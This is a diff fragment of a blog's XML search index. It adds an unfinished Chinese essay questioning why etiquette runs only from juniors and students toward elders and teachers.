-        <tag>礼仪</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
     <url>/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</url>
     <content><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p>
@@ -5599,6 +5584,21 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>动画</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅谈礼仪的对象</title>
+    <url>/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
+    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p>
+<span id="more"></span>
+<h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>
+]]></content>
+      <categories>
+        <category>随想</category>
+      </categories>
+      <tags>
+        <tag>随想</tag>
+        <tag>礼仪</tag>
       </tags>
   </entry>
   <entry>
